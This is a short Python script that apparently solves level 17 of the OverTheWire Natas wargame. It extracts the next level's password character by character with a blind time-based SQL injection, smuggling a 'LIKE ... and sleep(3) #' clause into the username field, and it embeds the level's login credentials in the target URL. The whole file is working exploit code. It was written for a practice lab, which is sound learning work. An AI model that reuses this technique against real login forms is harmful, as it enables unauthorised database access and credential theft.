import requests
import string
import time

url = "http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org?debug=true"

user = 'natas18'
sleep_time=3
passwd = ""
passwd_len = 32
for i in range(len(passwd), passwd_len):
	for char in string.digits + string.ascii_letters:
		trying = f"{passwd}{char}"
		cmd = f"{user}\" and BINARY password LIKE \"{trying}%\" and sleep({sleep_time}) #"
		start = time.time()
		r = requests.post(url, data={'username':cmd})
		elapsed = time.time() - start

		splitted = r.text.split('Executing query: ')[1].split('<br>')
		query_executed = splitted[0]
		warning_or_error = splitted[1]

		print(f"{query_executed} -- {elapsed}")

		if elapsed > sleep_time:
			passwd += char
			print(f"Got char -- Curent pass : {passwd}")
			break

print(f"Natas18 password is {passwd}")
